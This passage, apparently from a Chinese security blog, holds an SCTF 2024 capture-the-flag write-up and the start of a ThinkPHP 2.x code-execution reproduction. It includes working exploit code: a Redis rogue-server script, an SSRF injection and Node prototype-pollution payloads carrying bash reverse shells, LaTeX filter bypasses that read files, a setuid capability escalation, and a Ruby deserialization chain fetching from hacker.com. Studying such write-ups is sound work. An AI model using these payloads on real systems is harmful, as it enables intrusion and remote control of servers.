&quot;$&quot; + str(len(payload)) + CLRF</span><br><span class=\"line\">            resp &#x3D; resp.encode()</span><br><span class=\"line\">            resp +&#x3D; payload + CLRF.encode()</span><br><span class=\"line\">            if type(resp) !&#x3D; bytes:</span><br><span class=\"line\">                resp &#x3D;resp.encode()            </span><br><span class=\"line\">            conn.send(resp)    </span><br><span class=\"line\">        #elif &quot;exit&quot; in data:</span><br><span class=\"line\">            break</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class=\"line\"></span><br><span class=\"line\">    parser &#x3D; OptionParser()                     </span><br><span class=\"line\">    parser.add_option(&quot;--lport&quot;, dest&#x3D;&quot;lp&quot;, type&#x3D;&quot;int&quot;,help&#x3D;&quot;rogue server listen port, default 21000&quot;, default&#x3D;21000,metavar&#x3D;&quot;LOCAL_PORT&quot;)        </span><br><span class=\"line\">    parser.add_option(&quot;-f&quot;,&quot;--exp&quot;, dest&#x3D;&quot;exp&quot;, type&#x3D;&quot;string&quot;,help&#x3D;&quot;Redis Module to load, default exp.so&quot;, default&#x3D;&quot;exp.so&quot;,metavar&#x3D;&quot;EXP_FILE&quot;)            </span><br><span class=\"line\"></span><br><span class=\"line\">    (options , args )&#x3D; parser.parse_args()</span><br><span class=\"line\">    lport &#x3D; options.lp</span><br><span class=\"line\">    exp_filename &#x3D; options.exp</span><br><span class=\"line\"></span><br><span class=\"line\">    CLRF&#x3D;&quot;\\r\\n&quot;</span><br><span class=\"line\">    payload&#x3D;open(exp_filename,&quot;rb&quot;).read()</span><br><span class=\"line\">    print &quot;Start listing on port: %s&quot; %lport</span><br><span class=\"line\">    print &quot;Load the payload:   %s&quot; %exp_filename     </span><br><span class=\"line\">    RogueServer(lport)</span><br></pre></td></tr></table></figure>\n\n<p>构造ssrf请求</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">from flask import Flask, request, Response, redirect</span><br><span class=\"line\">import urllib.parse</span><br><span class=\"line\"></span><br><span class=\"line\">app &#x3D; Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&#39;&#x2F;play&#39;)</span><br><span class=\"line\">def exploit():</span><br><span class=\"line\">    # CORS preflight check</span><br><span class=\"line\">    if request.method &#x3D;&#x3D; &#39;HEAD&#39;:</span><br><span class=\"line\">        response &#x3D; Response()</span><br><span class=\"line\">        response.headers[&#39;Content-Type&#39;] &#x3D; &#39;text&#x2F;x-component&#39;</span><br><span class=\"line\">        return response</span><br><span class=\"line\">    # after CORS preflight check</span><br><span class=\"line\">    elif request.method &#x3D;&#x3D; &#39;GET&#39;:</span><br><span class=\"line\">        padding &#x3D; &quot;\\r\\n&quot;</span><br><span class=\"line\">        inject &#x3D; &quot;$1\\r\\na\\r\\n&quot;</span><br><span class=\"line\">        # 主从</span><br><span class=\"line\">        #inject +&#x3D; &quot;SLAVEOF 1.1.1.1 21000\\r\\n\\r\\n\\r\\nCONFIG SET dbfilename exp.so\\r\\n&quot;</span><br><span class=\"line\">        # 执行命令</span><br><span class=\"line\">        inject +&#x3D; &quot;MODULE LOAD .&#x2F;exp.so\\r\\nsystem.exec &#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;1.1.1.1&#x2F;1338 0&gt;&amp;1\\&quot;&#39;\\r\\n&quot;</span><br><span class=\"line\">        padding +&#x3D; inject</span><br><span class=\"line\">        user &#x3D; &quot;admin&quot;*len(padding)+padding</span><br><span class=\"line\">        ssrfUrl &#x3D; f&#39;http:&#x2F;&#x2F;172.11.0.3:5000&#x2F;login?password&#x3D;&amp;username&#x3D;&#123;urllib.parse.quote(user)&#125;&#39;</span><br><span class=\"line\">        return redirect(ssrfUrl)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class=\"line\">    app.run(port&#x3D;1337, host&#x3D;&#39;0.0.0.0&#39;, debug&#x3D;True)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002172739084.png\" alt=\"image-20241002172739084\"></p>\n<h1 id=\"ez-tex\"><a href=\"#ez-tex\" class=\"headerlink\" title=\"ez_tex\"></a>ez_tex</h1><p>上传/编译 LaTex 文件，无回显，/log路径只显示一个app.log</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002184754739.png\" alt=\"image-20241002184754739\"></p>\n<p>文件内容检测通过 <code>^^41 == A</code> 绕过，尝试往app.log写内容</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">\\documentclass[]&#123;article&#125;</span><br><span class=\"line\">\\begin&#123;document&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\\newwrite\\outfile</span><br><span class=\"line\">\\imm^^65diate\\openout\\outfile&#x3D;a^^70p.log</span><br><span class=\"line\">\\imm^^65diate\\write\\outfile&#123;helloworld&#125;</span><br><span class=\"line\">\\imm^^65diate\\closeout\\outfile</span><br><span class=\"line\"></span><br><span class=\"line\">\\end&#123;document&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002185205934.png\" alt=\"image-20241002185205934\"></p>\n<p>成功读取到main.py</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">\\documentclass&#123;article&#125;</span><br><span class=\"line\">\\begin&#123;document&#125;</span><br><span class=\"line\">\\newread\\infile</span><br><span class=\"line\">\\newwrite\\outfile</span><br><span class=\"line\">\\openin\\infile&#x3D;main.py</span><br><span class=\"line\">\\imm^^65diate\\openout\\outfile&#x3D;a^^70p.log</span><br><span class=\"line\">\\loop</span><br><span class=\"line\">    \\read\\infile to \\line</span><br><span class=\"line\">    \\ifeof\\infile\\else</span><br><span class=\"line\">        \\imm^^65diate\\write\\outfile&#123;\\line&#125;</span><br><span class=\"line\">\\repeat</span><br><span class=\"line\">\\closein\\infile</span><br><span class=\"line\">\\imm^^65diate\\closeout\\outfile</span><br><span class=\"line\">\\end&#123;document&#125;</span><br></pre></td></tr></table></figure>\n\n<p>main.py</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">import os </span><br><span class=\"line\">import logging </span><br><span class=\"line\">import subprocess </span><br><span class=\"line\">from flask import Flask, request, render_template, redirect </span><br><span class=\"line\">from werkzeug.utils import secure_filename </span><br><span class=\"line\"></span><br><span class=\"line\">app &#x3D; Flask(__name__) </span><br><span class=\"line\"></span><br><span class=\"line\">if not app.debug: </span><br><span class=\"line\">        handler &#x3D; logging.FileHandler(&#39;app.log&#39;) </span><br><span class=\"line\">        handler.setLevel(logging.INFO) </span><br><span class=\"line\">        app.logger.addHandler(handler) </span><br><span class=\"line\"></span><br><span class=\"line\">UPLOAD_FOLDER &#x3D; &#39;uploads&#39; </span><br><span class=\"line\">app.config[&#39;UPLOAD_FOLDER&#39;] &#x3D; UPLOAD_FOLDER </span><br><span class=\"line\"></span><br><span class=\"line\">os.makedirs(UPLOAD_FOLDER, exist_ok&#x3D;True) </span><br><span class=\"line\"></span><br><span class=\"line\">ALLOWED_EXTENSIONS &#x3D; &#123;&#39;txt&#39;, &#39;png&#39;, &#39;jpg&#39;, &#39;gif&#39;, &#39;log&#39;, &#39;tex&#39;&#125; </span><br><span class=\"line\"></span><br><span class=\"line\">def allowed_file(filename): </span><br><span class=\"line\">        return &#39;.&#39; in filename and \\ </span><br><span class=\"line\">        filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS </span><br><span class=\"line\"></span><br><span class=\"line\">def compile_tex(file_path): </span><br><span class=\"line\">        output_filename &#x3D; file_path.rsplit(&#39;.&#39;, 1)[0] + &#39;.pdf&#39; </span><br><span class=\"line\">        try: </span><br><span class=\"line\">                subprocess.check_call([&#39;pdflatex&#39;, file_path]) </span><br><span class=\"line\">                return output_filename </span><br><span class=\"line\">        except subprocess.CalledProcessError as e: </span><br><span class=\"line\">                return str(e) </span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&#39;&#x2F;&#39;) </span><br><span class=\"line\">def index(): </span><br><span class=\"line\">        return render_template(&#39;index.html&#39;) </span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&#39;&#x2F;upload&#39;, methods&#x3D;[&#39;POST&#39;]) </span><br><span class=\"line\">def upload_file(): </span><br><span class=\"line\">        if &#39;file&#39; not in request.files: </span><br><span class=\"line\">                return redirect(request.url) </span><br><span class=\"line\">        file &#x3D; request.files[&#39;file&#39;] </span><br><span class=\"line\">        if file.filename &#x3D;&#x3D; &#39;&#39;: </span><br><span class=\"line\">                return redirect(request.url) </span><br><span class=\"line\"></span><br><span class=\"line\">        if file and allowed_file(file.filename): </span><br><span class=\"line\">                content &#x3D; file.read() </span><br><span class=\"line\">                try: </span><br><span class=\"line\">                        content_str &#x3D; content.decode(&#39;utf-8&#39;) </span><br><span class=\"line\">                except UnicodeDecodeError: </span><br><span class=\"line\">                        return &#39;File content is not decodable&#39; </span><br><span class=\"line\">                for bad_char in [&#39;\\\\x&#39;, &#39;..&#39;, &#39;*&#39;, &#39;&#x2F;&#39;, &#39;input&#39;, &#39;include&#39;, &#39;write18&#39;, &#39;immediate&#39;,&#39;app&#39;, &#39;flag&#39;]: </span><br><span class=\"line\">                        if bad_char in content_str: </span><br><span class=\"line\">                                return &#39;File content is not safe&#39; </span><br><span class=\"line\">                file.seek(0) </span><br><span class=\"line\">                filename &#x3D; secure_filename(file.filename) </span><br><span class=\"line\">                file_path &#x3D; os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename) </span><br><span class=\"line\">                file.save(file_path) </span><br><span class=\"line\">                return &#39;File uploaded successfully, And you can compile the tex file&#39; </span><br><span class=\"line\">        else: </span><br><span class=\"line\">        return &#39;Invalid file type or name&#39; </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&#39;&#x2F;compile&#39;, methods&#x3D;[&#39;GET&#39;]) </span><br><span class=\"line\">def compile(): </span><br><span class=\"line\">        filename &#x3D; request.args.get(&#39;filename&#39;) </span><br><span class=\"line\"></span><br><span class=\"line\">        if not filename: </span><br><span class=\"line\">                return &#39;No filename provided&#39;, 400 </span><br><span class=\"line\"></span><br><span class=\"line\">        if len(filename) &gt;&#x3D; 7: </span><br><span class=\"line\">                return &#39;Invalid file name length&#39;, 400 </span><br><span class=\"line\"></span><br><span class=\"line\">        if not filename.endswith(&#39;.tex&#39;): </span><br><span class=\"line\">                return &#39;Invalid file type&#39;, 400 </span><br><span class=\"line\"></span><br><span class=\"line\">        file_path &#x3D; os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename) </span><br><span class=\"line\">        print(file_path) </span><br><span class=\"line\">        if not os.path.isfile(file_path): </span><br><span class=\"line\">                return &#39;File not found&#39;, 404 </span><br><span class=\"line\"></span><br><span class=\"line\">        output_pdf &#x3D; compile_tex(file_path) </span><br><span class=\"line\">        if output_pdf.endswith(&#39;.pdf&#39;): </span><br><span class=\"line\">                return &quot;Compilation succeeded&quot; </span><br><span class=\"line\">        else: </span><br><span class=\"line\">                return &#39;Compilation failed&#39;, 500 </span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&#39;&#x2F;log&#39;) </span><br><span class=\"line\">def log(): </span><br><span class=\"line\">        try: </span><br><span class=\"line\">                with open(&#39;app.log&#39;, &#39;r&#39;) as log_file: </span><br><span class=\"line\">                log_contents &#x3D; log_file.read() </span><br><span class=\"line\">                return render_template(&#39;log.html&#39;, log_contents&#x3D;log_contents) </span><br><span class=\"line\">        except FileNotFoundError: </span><br><span class=\"line\">                return &#39;Log file not found&#39;, 404 </span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ &#x3D;&#x3D; &#39;__main__&#39;: </span><br><span class=\"line\">app.run(host&#x3D;&#39;0.0.0.0&#39;, port&#x3D;3000, debug&#x3D;False) </span><br></pre></td></tr></table></figure>\n\n<p>写html打SSTI，然后suid提权无果，<strong>Capabilities 提权</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002191814264.png\" alt=\"image-20241002191814264\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3.11 -c &#39;import os; os.setuid(0); os.system(&quot;cat &#x2F;root&#x2F;sctf &gt; &#x2F;app&#x2F;ez_tex&#x2F;static&#x2F;1.txt&quot;)&#39;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002192220297.png\" alt=\"image-20241002192220297\"></p>\n<h1 id=\"havefun\"><a href=\"#havefun\" class=\"headerlink\" title=\"havefun\"></a>havefun</h1><blockquote>\n<p>小李刚毕业入职一家公司，老板交给了他一个任务，但是他第一次配置php相关服务，好像存在一些问题，马上要检查了，小李是否会挨骂呢？</p>\n</blockquote>\n<p>主页指向了 <code>/static/SCTF.jpg</code> ，文件尾存在php代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$file &#x3D; &#39;&#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;000-default.conf&#39;;</span><br><span class=\"line\">$content &#x3D; file_get_contents($file);</span><br><span class=\"line\">echo htmlspecialchars($content);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>通过 <strong>路径解析错误</strong> 成功将jpg执行为php <code>http://1.95.37.51/static/SCTF.jpg/a.php</code></p>\n<p>获取到 000-default.conf 内容</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;VirtualHost *:80&gt;</span><br><span class=\"line\">        ServerAdmin webmaster@localhost</span><br><span class=\"line\">        DocumentRoot &#x2F;var&#x2F;www&#x2F;html</span><br><span class=\"line\">        PassengerAppRoot &#x2F;usr&#x2F;share&#x2F;redmine</span><br><span class=\"line\"></span><br><span class=\"line\">        ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log</span><br><span class=\"line\">        CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined</span><br><span class=\"line\">        &lt;Directory &#x2F;var&#x2F;www&#x2F;html&#x2F;redmine&gt;</span><br><span class=\"line\">                RailsBaseURI &#x2F;redmine</span><br><span class=\"line\">                #PassengerResolveSymlinksInDocumentRoot on</span><br><span class=\"line\">        &lt;&#x2F;Directory&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">        RewriteEngine On</span><br><span class=\"line\">        RewriteRule  ^(.+\\.php)$  $1  [H&#x3D;application&#x2F;x-httpd-php]</span><br><span class=\"line\">        LogLevel alert rewrite:trace3</span><br><span class=\"line\">        RewriteEngine On</span><br><span class=\"line\">        RewriteRule  ^&#x2F;profile&#x2F;(.*)$   &#x2F;$1.html</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;&#x2F;VirtualHost&gt;</span><br></pre></td></tr></table></figure>\n\n<p>其中两条重写规则</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">RewriteRule  ^(.+\\.php)$  $1  [H&#x3D;application&#x2F;x-httpd-php]</span><br><span class=\"line\">RewriteRule  ^&#x2F;profile&#x2F;(.*)$   &#x2F;$1.html</span><br></pre></td></tr></table></figure>\n\n<p>根据橘子神的：<a href=\"https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\">Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server! </a> 中的</p>\n<p><code>Jailbreak Local Gadgets to Redmine RCE</code>，可以轻松获取到 secret_key.txt 的内容，从而实现攻击 <code>Ruby on Rails</code>，一个通过Cookie反序列化的RCE：<a href=\"https://drive.google.com/file/d/1UMxphxFxwRf7wbrw4_Hr56KGPzpLU3Ef/view\">小心！你的 Rails 有被打過嗎？</a></p>\n<p>获取secret</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;1.95.37.51&#x2F;profile&#x2F;usr&#x2F;share&#x2F;redmine&#x2F;instances&#x2F;default&#x2F;config&#x2F;secret_key.txt%3f</span><br></pre></td></tr></table></figure>\n\n<p>环境安装失败，记录poc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Autoload the required classes</span><br><span class=\"line\">require &#39;uri&#39;</span><br><span class=\"line\">require &#39;rails&#x2F;all&#39;</span><br><span class=\"line\">Gem::SpecFetcher</span><br><span class=\"line\"></span><br><span class=\"line\"># create a file a.rz and host it somewhere accessible with https</span><br><span class=\"line\">def generate_rz_file(payload)</span><br><span class=\"line\">  require &quot;zlib&quot;</span><br><span class=\"line\">  spec &#x3D; Marshal.dump(Gem::Specification.new(&quot;bundler&quot;))</span><br><span class=\"line\"></span><br><span class=\"line\">  out &#x3D; Zlib::Deflate.deflate( spec + &quot;\\&quot;]\\n&quot; + payload + &quot;\\necho ref;exit 0;\\n&quot;)</span><br><span class=\"line\">  puts out.inspect</span><br><span class=\"line\"></span><br><span class=\"line\">  File.open(&quot;a.rz&quot;, &quot;wb&quot;) do |file|</span><br><span class=\"line\">    file.write(out)</span><br><span class=\"line\">  end</span><br><span class=\"line\">end</span><br><span class=\"line\"></span><br><span class=\"line\">def create_folder</span><br><span class=\"line\">  uri &#x3D; URI::HTTP.allocate</span><br><span class=\"line\">  uri.instance_variable_set(&quot;@path&quot;, &quot;&#x2F;&quot;)</span><br><span class=\"line\">  uri.instance_variable_set(&quot;@scheme&quot;, &quot;s3&quot;)</span><br><span class=\"line\">  uri.instance_variable_set(&quot;@host&quot;, &quot;hacker.com&#x2F;sctf2024&#x2F;a.rz?&quot;)  # use the https host+path with your rz file</span><br><span class=\"line\"></span><br><span class=\"line\">  uri.instance_variable_set(&quot;@port&quot;, &quot;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;cache&#x2F;bundler&#x2F;git&#x2F;aaa-e1a1d77599bf23fec08e2693f5dd418f77c56301&#x2F;&quot;)</span><br><span class=\"line\">  uri.instance_variable_set(&quot;@user&quot;, &quot;user&quot;)</span><br><span class=\"line\">  uri.instance_variable_set(&quot;@password&quot;, &quot;password&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">  spec &#x3D; Gem::Source.allocate</span><br><span class=\"line\">  spec.instance_variable_set(&quot;@uri&quot;, uri)</span><br><span class=\"line\">  spec.instance_variable_set(&quot;@update_cache&quot;, true)</span><br><span class=\"line\"></span><br><span class=\"line\">  request &#x3D; Gem::Resolver::IndexSpecification.allocate</span><br><span class=\"line\">  request.instance_variable_set(&quot;@name&quot;, &quot;name&quot;)</span><br><span class=\"line\">  request.instance_variable_set(&quot;@source&quot;, spec)</span><br><span class=\"line\"></span><br><span class=\"line\">  s &#x3D; [request]</span><br><span class=\"line\"></span><br><span class=\"line\">  r &#x3D; Gem::RequestSet.allocate</span><br><span class=\"line\">  r.instance_variable_set(&quot;@sorted&quot;, s)</span><br><span class=\"line\"></span><br><span class=\"line\">  l &#x3D; Gem::RequestSet::Lockfile.allocate</span><br><span class=\"line\">  l.instance_variable_set(&quot;@set&quot;, r)</span><br><span class=\"line\">  l.instance_variable_set(&quot;@dependencies&quot;, [])</span><br><span class=\"line\"></span><br><span class=\"line\">  l</span><br><span class=\"line\">end</span><br><span class=\"line\"></span><br><span class=\"line\">def git_gadget(git, reference)</span><br><span class=\"line\">  gsg &#x3D; Gem::Source::Git.allocate</span><br><span class=\"line\">  gsg.instance_variable_set(&quot;@git&quot;, git)</span><br><span class=\"line\">  gsg.instance_variable_set(&quot;@reference&quot;, reference)</span><br><span class=\"line\">  gsg.instance_variable_set(&quot;@root_dir&quot;,&quot;&#x2F;tmp&quot;)</span><br><span class=\"line\">  gsg.instance_variable_set(&quot;@repository&quot;,&quot;vakzz&quot;)</span><br><span class=\"line\">  gsg.instance_variable_set(&quot;@name&quot;,&quot;aaa&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">  basic_spec &#x3D; Gem::Resolver::Specification.allocate</span><br><span class=\"line\">  basic_spec.instance_variable_set(&quot;@name&quot;,&quot;name&quot;)</span><br><span class=\"line\">  basic_spec.instance_variable_set(&quot;@dependencies&quot;,[])</span><br><span class=\"line\"></span><br><span class=\"line\">  git_spec &#x3D; Gem::Resolver::GitSpecification.allocate</span><br><span class=\"line\">  git_spec.instance_variable_set(&quot;@source&quot;, gsg)</span><br><span class=\"line\">  git_spec.instance_variable_set(&quot;@spec&quot;, basic_spec)</span><br><span class=\"line\"></span><br><span class=\"line\">  spec &#x3D; Gem::Resolver::SpecSpecification.allocate</span><br><span class=\"line\">  spec.instance_variable_set(&quot;@spec&quot;, git_spec)</span><br><span class=\"line\"></span><br><span class=\"line\">  spec</span><br><span class=\"line\">end</span><br><span class=\"line\"></span><br><span class=\"line\">def popen_gadget</span><br><span class=\"line\">  spec1 &#x3D; git_gadget(&quot;tee&quot;, &#123; in: &quot;&#x2F;tmp&#x2F;cache&#x2F;bundler&#x2F;git&#x2F;aaa-e1a1d77599bf23fec08e2693f5dd418f77c56301&#x2F;quick&#x2F;Marshal.4.8&#x2F;name-.gemspec&quot;&#125;)</span><br><span class=\"line\">  spec2 &#x3D; git_gadget(&quot;sh&quot;, &#123;&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">  s &#x3D; [spec1, spec2]</span><br><span class=\"line\"></span><br><span class=\"line\">  r &#x3D; Gem::RequestSet.allocate</span><br><span class=\"line\">  r.instance_variable_set(&quot;@sorted&quot;, s)</span><br><span class=\"line\"></span><br><span class=\"line\">  l &#x3D; Gem::RequestSet::Lockfile.allocate</span><br><span class=\"line\">  l.instance_variable_set(&quot;@set&quot;, r)</span><br><span class=\"line\">  l.instance_variable_set(&quot;@dependencies&quot;,[])</span><br><span class=\"line\"></span><br><span class=\"line\">  l</span><br><span class=\"line\">end</span><br><span class=\"line\"></span><br><span class=\"line\">def to_s_wrapper(inner)</span><br><span class=\"line\">  s &#x3D; Gem::Specification.new</span><br><span class=\"line\">  s.instance_variable_set(&quot;@new_platform&quot;, inner)</span><br><span class=\"line\">  s</span><br><span class=\"line\">end</span><br><span class=\"line\"></span><br><span class=\"line\">folder_gadget &#x3D; create_folder</span><br><span class=\"line\">exec_gadget &#x3D; popen_gadget</span><br><span class=\"line\">generate_rz_file((&quot;ruby -rsocket -e &#39;exit if fork;c&#x3D;TCPSocket.new(\\&quot;1.1.1.1\\&quot;,\\&quot;1337\\&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,\\&quot;r\\&quot;)&#123;|io|c.print io.read&#125;end&#39;&quot;))</span><br><span class=\"line\">r &#x3D; Marshal.dump([Gem::SpecFetcher, to_s_wrapper(folder_gadget), to_s_wrapper(exec_gadget)])</span><br><span class=\"line\">#Marshal.load(r)</span><br><span class=\"line\">#puts %&#123;Marshal.load([&quot;#&#123;r.unpack(&quot;H*&quot;)&#125;&quot;].pack(&quot;H*&quot;))&#125;</span><br><span class=\"line\">def sign_and_encryt_data(data,secret_key_base)</span><br><span class=\"line\">        salt &#x3D; &#39;authenticated encrypted cookie&#39;</span><br><span class=\"line\">        encrypted_cookie_cipher&#x3D;&#39;aes-256-gcm&#39;</span><br><span class=\"line\">        serializer&#x3D;ActiveSupport::MessageEncryptor::NullSerializer</span><br><span class=\"line\">        key_generator&#x3D;ActiveSupport::KeyGenerator.new(secret_key_base,iterations: 1000)</span><br><span class=\"line\">        key_len&#x3D;ActiveSupport::MessageEncryptor.key_len(encrypted_cookie_cipher)</span><br><span class=\"line\">        secret&#x3D;key_generator.generate_key(salt,key_len)</span><br><span class=\"line\">        encryptor&#x3D;ActiveSupport::MessageEncryptor.new(secret,cipher: encrypted_cookie_cipher,serializer: serializer)</span><br><span class=\"line\">        data&#x3D;encryptor.encrypt_and_sign(data)</span><br><span class=\"line\">        CGI::escape(data)</span><br><span class=\"line\">end</span><br><span class=\"line\">puts sign_and_encryt_data(r,ARGV[0])</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"SycServer2-0\"><a href=\"#SycServer2-0\" class=\"headerlink\" title=\"SycServer2.0\"></a>SycServer2.0</h1><p>登录框，前端对username、password进行sqlwaf、加密</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241001133002206.png\" alt=\"image-20241001133002206\"></p>\n<p>将func wafsql置为空，然后万能密码登录</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241001133201196.png\" alt=\"image-20241001133201196\"></p>\n<p>robots.txt中路由 <code>/ExP0rtApi?v=./&amp;f=app.js</code> 存在文件读取，CyberChef解密</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241001134053707.png\" alt=\"image-20241001134053707\"></p>\n<p>通过污染env和shell环境变量来命令注入，<a href=\"https://po6ix.github.io/Abusing-Environment-Variables/\">Abusing Environment Variables</a>、<a href=\"http://47.103.121.189/2023/04/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2023%E7%BA%BF%E4%B8%8B%E5%8D%8A%E5%86%B3%E8%B5%9B%E7%AA%81%E7%A0%B4%E9%A2%98errormsg%E5%A4%8D%E7%8E%B0/\">网鼎杯2023线下半决赛突破题errormsg复现</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;user&quot;:&quot;__proto__&quot;,</span><br><span class=\"line\">    &quot;date&quot;:&quot;2&quot;,</span><br><span class=\"line\">    &quot;reportmessage&quot;:&#123;</span><br><span class=\"line\">        &quot;shell&quot;:&quot;&#x2F;readflag&quot;,</span><br><span class=\"line\">        &quot;env&quot;:&#123;</span><br><span class=\"line\">            &quot;NODE_DEBUG&quot;:&quot;require(&#39;child_process&#39;).execSync(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1\\&quot;&#39;);process.exit();&#x2F;&#x2F;&quot;,</span><br><span class=\"line\">            &quot;NODE_OPTIONS&quot;:&quot;-r &#x2F;proc&#x2F;self&#x2F;environ&quot;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;user&quot;:&quot;__proto__&quot;,</span><br><span class=\"line\">    &quot;date&quot;:&quot;2&quot;,</span><br><span class=\"line\">    &quot;reportmessage&quot;:&#123;</span><br><span class=\"line\">        &quot;shell&quot;:&quot;&#x2F;bin&#x2F;bash&quot;,</span><br><span class=\"line\">        &quot;env&quot;:&#123;</span><br><span class=\"line\">            &quot;BASH_FUNC_whoami%%&quot;:&quot;() &#123; &#x2F;readflag;&#125;&quot;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/sctf2024/image-20241002233451220.png\" alt=\"image-20241002233451220\"></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://blog.wm-team.cn/index.php/archives/82/\">https://blog.wm-team.cn/index.php/archives/82/</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/qOueXdU3UaKiJoUnuUjBEA\">https://mp.weixin.qq.com/s/qOueXdU3UaKiJoUnuUjBEA</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/jp2ePXS1feCn0XLwadXhlg\">https://mp.weixin.qq.com/s/jp2ePXS1feCn0XLwadXhlg</a></p>\n","categories":["赛题wp"]},{"title":"ThinkPHP 2.x 任意代码执行","url":"/2023/12/25/ThinkPHP%202.x%20%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","content":"<h1 id=\"漏洞概述\"><a href=\"#漏洞概述\" class=\"headerlink\" title=\"漏洞概述\"></a>漏洞概述</h1><p>ThinkPHP 2.x版本中，使用preg_replace的/e模式匹配路由：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$res</span> = preg_replace(<span class=\"string\">&#x27;@(\\w+)&#x27;</span>.<span class=\"variable\">$depr</span>.<span class=\"string\">&#x27;([^&#x27;</span>.<span class=\"variable\">$depr</span>.<span class=\"string\">&#x27;\\/]+)@e&#x27;</span>, <span class=\"string\">&#x27;$var[\\&#x27;\\\\1\\&#x27;]=&quot;\\\\2&quot;;&#x27;</span>, implode(<span class=\"variable\">$depr</span>,<span class=\"variable\">$paths</span>));</span><br></pre></td></tr></table></figure>\n<p>导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞</p>\n<a id=\"more\"></a>\n\n<h1 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">URL传参</span><br><span 